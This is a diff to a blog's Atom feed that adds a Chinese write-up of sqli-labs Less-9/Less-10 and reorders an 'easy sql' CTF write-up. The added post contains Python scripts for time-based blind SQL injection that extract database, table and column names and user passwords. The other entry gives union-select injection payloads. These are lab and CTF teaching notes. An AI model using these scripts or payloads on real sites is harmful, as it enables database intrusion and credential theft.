@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-11-06T03:39:04.113Z</updated>
+  <updated>2021-11-28T02:37:21.163Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>less9 and less 10</title>
+    <link href="http://example.com/2021/11/28/less9%20less10/"/>
+    <id>http://example.com/2021/11/28/less9%20less10/</id>
+    <published>2021-11-27T16:00:00.000Z</published>
+    <updated>2021-11-28T02:37:21.163Z</updated>
+    
+    <content type="html"><![CDATA[<p>less9与less10相似，区别在于在使用延迟语句确认是否存在注入时，less9使用’时存在闭合，less10使用”时存在闭合。<br><img src="https://i.loli.net/2021/11/28/O6Gy3sjTAVtvl8B.png" alt="图片1.png"><br><img src="https://i.loli.net/2021/11/28/GUo4piLg73nW5PJ.png" alt="图片2.png"><br>知道存在注入后，由于此题在语法错误时仍然有you are in回显，<br>所以使用python进行时间盲注<br>    import requests<br>    import time<br>    import datetime<br>    url=”<a href="http://www/Less-9/?id=1&#39;">http://www/Less-9/?id=1&#39;</a> “<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    name = ‘’<br>    for i in range(1, 9):<br>        for j in dic:<br>            payload = “ and if(substr(database(),%s,1)=’%s’,sleep(4),1)–+” %(i, j)<br>            url1 = url + payload<br>            print(url1)<br>            time1 = datetime.datetime.now()<br>            r = requests.get(url=url1)<br>            time2 = datetime.datetime.now()<br>            time3 = (time2 - time1).total_seconds()   //计算出在得出结果后经历的时间，大于4则if的条件为真则可以得到库名<br>            if time3 &gt;= 4:<br>                name += j<br>                print(name)<br>                break<br>    n = name<br>    print(‘数据库名字为:’ + n)<br>之后在运用for循环查出表名<br>    import requests<br>    import time<br>    import datetime<br>    url=”<a href="http://www/Less-9/?id=1&#39;">http://www/Less-9/?id=1&#39;</a> “<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag1=””<br>    flag2=””<br>    flag3=””</p><pre><code>flag4=&quot;&quot;for a in range(5):    for i in range(1, 9):        for j in dic:            payload = &quot; and sleep(if((substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)=&#39;%s&#39;),3,0)) --+&quot; % (            a, i, j)            url1 = url + payload            print(url1)            time1 = datetime.datetime.now()            r = requests.get(url=url1)            time2 = datetime.datetime.now()            time3 = (time2 - time1).total_seconds()            if time3&gt;=3:                if a==0:                    flag1+=j                    print(flag1)                elif a==1:                    flag2+=j                    print(flag2)                elif a==2:                    flag3+=j                    print(flag3)                elif a==3:                    flag4+=j                    print(flag4)                else:                    breakprint(&#39;数据库名字为:&#39; + flag1)print(&#39;数据库名字为:&#39; + flag2)print(&#39;数据库名字为:&#39; + flag3)print(&#39;数据库名字为:&#39; + flag4)</code></pre><p>之后查列名及字段只需改变<br>     payload = “ and sleep(if((substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>列名：<br>     payload = “ and sleep(if((substr((select column_name from information_schema.columns where table_name=’users’ limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>字段：<br>     payload = “ and sleep(if((substr((select password from security.users limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>less10只需将1’改为1”即可</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;less9与less10相似，区别在于在使用延迟语句确认是否存在注入时，less9使用’时存在闭合，less10使用”时存在闭合。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/28/O6Gy3sjTAVtvl8B.png&quot; alt=&quot;图片</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>利用phpstudy里的MySQL并通过命令行</title>
@@ -162,26 +182,6 @@ f</summary>
   </entry>
   
   <entry>
-    <title>easy sql</title>
-    <link href="http://example.com/1970/01/01/easy%20sql/"/>
-    <id>http://example.com/1970/01/01/easy%20sql/</id>
-    <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-11-13T09:03:03.383Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png" alt="1"><br>由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值<br><img src="https://i.loli.net/2021/11/13/C2sXQnDSt5i4rZ1.png" alt="2"><br>由打入1’可知进入数据库的数据有’  ‘ 包裹<br>在地址后输入：?wllm=-1’ union select 1,2,database()–+以此来查询库的位置database（）即打印库的位置，–+注释了输入数据之后’limit0，1，以此来显示出自己查表所显示的数值<br><img src="https://i.loli.net/2021/11/13/OmGi7adEkJX1sUL.png" alt="3"><br>之后查表输入：?wllm=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database() –+<br><img src="https://i.loli.net/2021/11/13/GM4PJy1KHIFbrNA.png" alt="4"><br>查到表后猜测相应的flag在test_tb中<br>差表中数据输入：?wllm=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’test_tb’ –+<br><img src="https://i.loli.net/2021/11/13/tPvE9qOQo8UR3mk.png" alt="5"><br>最后就是输出flag中的数据<br>输入：?wllm=-1’ union select 1,2,group_concat(flag)from test_tb –+<br><img src="https://i.loli.net/2021/11/13/HPCzUR1A76wlgmG.png" alt="6"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值&lt;br&gt;&lt;img</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
     <title>less 8</title>
     <link href="http://example.com/1970/01/01/less8/"/>
     <id>http://example.com/1970/01/01/less8/</id>
@@ -194,6 +194,26 @@ f</summary>
       
       
     <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png&quot;</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>easy sql</title>
+    <link href="http://example.com/1970/01/01/easy%20sql/"/>
+    <id>http://example.com/1970/01/01/easy%20sql/</id>
+    <published>1970-01-01T00:00:02.021Z</published>
+    <updated>2021-11-13T09:03:03.383Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png" alt="1"><br>由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值<br><img src="https://i.loli.net/2021/11/13/C2sXQnDSt5i4rZ1.png" alt="2"><br>由打入1’可知进入数据库的数据有’  ‘ 包裹<br>在地址后输入：?wllm=-1’ union select 1,2,database()–+以此来查询库的位置database（）即打印库的位置，–+注释了输入数据之后’limit0，1，以此来显示出自己查表所显示的数值<br><img src="https://i.loli.net/2021/11/13/OmGi7adEkJX1sUL.png" alt="3"><br>之后查表输入：?wllm=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database() –+<br><img src="https://i.loli.net/2021/11/13/GM4PJy1KHIFbrNA.png" alt="4"><br>查到表后猜测相应的flag在test_tb中<br>差表中数据输入：?wllm=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’test_tb’ –+<br><img src="https://i.loli.net/2021/11/13/tPvE9qOQo8UR3mk.png" alt="5"><br>最后就是输出flag中的数据<br>输入：?wllm=-1’ union select 1,2,group_concat(flag)from test_tb –+<br><img src="https://i.loli.net/2021/11/13/HPCzUR1A76wlgmG.png" alt="6"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值&lt;br&gt;&lt;img</summary>
       
     
     
